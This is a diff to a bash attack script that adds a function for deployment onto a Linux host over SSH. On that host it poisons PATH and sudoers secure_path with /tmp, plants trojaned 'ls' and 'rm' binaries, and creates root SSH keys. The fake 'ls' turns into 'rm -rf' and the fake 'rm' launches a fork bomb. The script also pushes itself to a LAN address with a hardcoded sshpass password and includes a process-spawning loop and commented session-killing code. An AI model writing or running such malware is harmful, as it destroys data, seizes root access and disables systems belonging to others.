@@ -18,6 +18,10 @@
 	# clean it up
 	# stop using tmp files
 	# add testing for files and what not to get rid of error spam
+	# multithread. one at a time is dumb
+	# change spectre so it checks if its on attack/cleanup (fuck/unfuck) duty. (loops)
+	# setup multiple levels of complexity of attack (ie altering sshkey file lookup locations)
+	# fix the for loop garbage in the colorizer
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -26,11 +30,11 @@
 #### RUN function #####
 #######################
 function main(){	###
-	neo				###
-	meat			###
-	bones			###
-	brute			###
-	assassin		###
+#	neo				###
+#	meat			###
+#	bones			###
+#	brute			###
+	spectre			###
 }					###
 #######################
 #------ error handling ----------
@@ -45,6 +49,7 @@ set -e							#
 #trap 'exit' ERR				#
 #--------------------------------
 #### Variables ####
+attackDog=$(hostname -I)
 pwListFull="/usr/share/wordlists/rockyou.txt"
 userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
 listsDir="/usr/share/wordlists"
@@ -95,7 +100,7 @@ function bones(){
 ###########################################################################################
 function meat(){
 # wanted app lists
-	command="hydra hashcat john nmap curl net-tools"
+	command="hydra hashcat john nmap curl net-tools sshpass"
 	installing=""
 	updated=0
 	scriptPath="$(pwd)/$(basename $0)"
@@ -181,10 +186,284 @@ function brute(){
 ###########################################################################################
 # ssh's in and does it's business
 ###########################################################################################
-function assassin(){
-	#
-	:
+### wont be clearing logs or trying to hide footprints at all ###
+function spectre(){
+	#### launcher ###########
+	function payload(){		#
+		fuck 				#
+	#	unfuck				#
+	}						#
+	#########################
+		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
+		# Ubuntu
+		ubuPATH="/etc/environment"
+		ubuSecPATH="/etc/sudoers"
+		ubuSecPATHnew="/etc/sudoers.new"
+		ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+		ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+			ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
+			ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
+		# BOTH
+			#bothCleanColor53PS1='PS1="${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "'
+			#bothCleanBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}\u@\h:\w\$ "'
+			#bothCleanXterm62PS1='PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"'
+		bothCleanColor53PS1='PS1="${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "'
+		bothCleanBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ "'
+		bothCleanXterm62PS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1"'
+
+		bothCleanPS1Vars='$bothCleanColor53PS1 $bothCleanBasic55PS1 $bothCleanXterm62PS1'
+
+			bothDirtyPS1Vars='$bothDirtyColor53PS1 $bothDirtyBasic55PS1 $bothDirtyXterm62PS1'
+			bothDirtyColor53PS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyBasic55PS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
+			bothDirtyXterm62PS1='PS1="\\[\\e]0;${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h: \\w\\a\\]$PS1"'
+		# Debian
+		debPATH="/etc/profile"
+		debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+		debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+			debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
+			debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
+
+	function ubuVisudo(){
+		# copies and edits the sudoers file
+		sudo cp $ubuSecPATH $ubuSecPATHnew
+		sudo chmod 750 $ubuSecPATHnew
+		sudo sed -i "s|$1|$2|" $ubuSecPATHnew
+		sudo chmod 0440 $ubuSecPATHnew
+		# checks that the changes are good
+		visudo -c -f $ubuSecPATHnew
+		# moves the modified file over the old one
+		if [ "$?" -eq "0" ]; then
+		sudo cp $ubuSecPATHnew $ubuSecPATH
+		fi
+		#garbage collection
+		sudo rm $ubuSecPATHnew
 	}
+### fuck ##########################################
+	function fuck(){
+#################
+	seeder		#
+	#sandman	#
+	#terminator	#
+#################
+	### is Debian ###
+		if [ $osDetect == "Debian" ]; then
+			testPATH="echo $PATH | cut -d: -f1"
+			if [[ "$testPATH" != "/tmp" ]]; then
+				#changes PATH for current user, no matter what it is
+				sudo sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
+			fi
+
+			sudo sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
+			sudo sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
+		fi
+		### is Ubuntu ###
+			if [ $osDetect == "Ubuntu" ]; then
+				sudo sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH
+				ubuVisudo $ubuCleanRootPATH $ubuDirtyRootPATH
+			#colorizing bash shell
+				userList=$(find /home /root -name .bashrc)
+				for rc in $userList;do
+					sudo sed -i "s/.*PS1.*/$bothDirtyBasic55PS1/g" $rc
+				done
+			fi
+	}
+
+### un-fuck ########################################
+	function unfuck(){
+	### is Debian ###
+		if [ $osDetect == "Debian" ]; then
+			sudo sed -i "s|$debDirtyRootPATH|$debCleanRootPATH|" $debPATH
+			sudo sed -i "s|$debDirtyUserPATH|$debCleanUserPATH|" $debPATH
+		fi
+	### is Ubuntu ###
+		if [ $osDetect == "Ubuntu" ]; then
+			sudo sed -i "s|$ubuDirtyUserPATH|$ubuCleanUserPATH|" $ubuPATH
+			ubuVisudo $ubuDirtyRootPATH $ubuCleanRootPATH
+			printf "\n+++++++\ndirtyRoot=$ubuDirtyRootPATH\ncleanRoot=$ubuCleanRootPATH"
+		fi
+	# deletes all the dirty scipts
+	sudo /bin/rm -f $seedPathsLS $seedPathsRM
+	echo $seedPathsLS $seedPathsRM
+	# clears cached paths
+	sudo hash -r
+	#*********************
+	#***missing colorizer
+	#*********************
+	}
+
+#** colorizer ######################################
+#	function colorizer(){
+#		#53,55,62
+
+#	}
+
+### Seeder ########################################
+	function seeder(){
+		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
+		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
+		triggerPath="/tmp/.trigger"
+		incrementPath="/tmp/.increment"
+		sshKey="/root/.ssh/id_rsa"
+		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
+		sudo echo "$dirtyLS" | tee $seedPathsLS > /dev/null
+		sudo echo "$dirtyRM" | tee $seedPathsRM > /dev/null
+		# creates/resets the increment file
+		sudo echo "increment=0" > $incrementPath
+		# creates the trigger file
+		sudo touch $triggerPath
+		# makes everything executable
+		sudo chmod +x $seedPathsLS $seedPathsRM
+		sudo chmod 777 $seedPathsLS $seedPathsRM
+		##################
+		### Key Master ###
+		##################
+		###could just replace all pub/priv keys, but lets be a little subtle..###
+		###could also change keyfile location, add a new kf, and leave all the old ones###
+		###leaving defaults to keep it simple###
+		#---------------------------------------
+		#checks if a key exists, then makes one
+		if [ ! -e $sshKey ]; then
+			ssh-keygen -f $sshKey -t rsa -N ''
+		fi
+		#disables password login for ssh (making it obvious something is wrong)
+
+		#adding self to target's root auth list
+		#cat ~/.ssh/id_rsa.pub | ssh USER@TARGETIP 'echo "PASSWORD" | sudo -S mkdir -p ~/.ssh /root/.ssh && cat | tee -a ~/.ssh/authorized_keys /root/.ssh/authorized_keys'
+	}
+
+
+
+#** Terminator ####################################
+	function terminator(){
+	#### sending the payload ####
+	sshpass -p hi ssh -o StrictHostKeyChecking=no norm@192.168.86.28 "$(declare -f spectre); spectre"
+		# auto ssh login
+			#sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no USER@IP
+		# run function on target machine
+			#ssh root@MachineB "$(declare -f spectre); spectre"
+		# combo
+			##doesn'twork###sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no USER@IP "$(declare -f spectre; echo PASSWORD | su -)"
+			##have to add fucking sudo to everything
+				#function sshcontrol(){
+				#echo hi | sudo -S mkdir -p /root/pleasejustowrk
+				#}
+				#sshpass -p hi ssh -o StrictHostKeyChecking=no norm@192.168.86.28 "$(declare -f sshcontrol); sshcontrol"
+	#### killing sessions ####
+#		killTargets=$(who -u | grep -v $attackDog | awk '{print $6}')
+#		for target in $killTargets; do
+#			kill -9 $target
+#		done
+	}
+
+### Sandman #######################################
+	function sandman(){
+		while : ; do
+			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
+		done
+	}
+
+###################################################
+### dirty scripts #################################
+###################################################
+	dirtyLS="$(cat <<-'EOF'
+	#!/bin/bash
+	#
+	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
+	#
+	triggerPath="/tmp/.trigger"
+	# pulls in and builds argsLS for the real ls
+	argsLS=""
+	while [[ "$1" != "" ]]; do
+		argsLS="$1 ${argsLS}"
+		shift
+	done
+
+	# checks for the trigger file, if it exists it acts like normal
+	if [ ! -e $triggerPath ]; then
+		/bin/rm -rf $argsLS
+		#could just as easily `shred` to be meaner
+	else
+		/bin/ls $argsLS
+		#hints at the issue
+		printf "\n\n----\n"
+		printf "argsLS= $argsLS\n"
+	fi
+	EOF
+	)"
+###########################################################
+	dirtyRM="$(cat <<-'EOF'
+	#!/bin/bash
+	#
+	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
+	#
+	trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
+	#####################
+	function mainRM(){	#
+		buildEmUp $*	#
+		tripwire		#
+	}					#
+	#####################
+	triggerPath="/tmp/.trigger"
+	### defining, and sourcing, increment info ###
+	function buildEmUp(){
+		incrementPath="/tmp/.increment"
+			# checking if increment file exists, making it if not
+			if [ ! -e $incrementPath ]; then
+				echo "increment=0" > $incrementPath
+			fi
+		source $incrementPath
+
+		# pulls in and builds argsRM for the real rm
+		argsRM=""
+		while [[ "$1" != "" ]]; do
+			argsRM="$1 ${argsRM}"
+			shift
+		done
+	}
+	#### checks for the trigger file, if its there it acts like normal ###
+	function tripwire(){
+		if [ ! -e $triggerPath ]; then
+			echo "trigger is missing"
+			rmCase
+		else
+			/bin/rm $argsRM
+			#hints at the issue
+			printf "\n\n----\n"
+			printf "argsRM= $argsRM\n"
+		fi
+	}
+	### determining what happens based on number of times used ###
+	function rmCase(){
+		case $increment in
+			0)
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					echo "after case: $attemptNum"
+					echo "increment: $increment"
+					echo "hard drives are big. no need to delete anything.."
+					;;
+			1)
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					printf "\nrude.\nstop that.\n"
+					;;
+			2)
+					clear
+					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
+					echo $increment
+					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2; :(){ :|:& };:
+					;;
+			*)
+					clear
+					printf "\nBewbs\n"
+					;;
+		esac
+	}
+	mainRM $*
+	EOF
+	)"
+
+	payload
+}
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
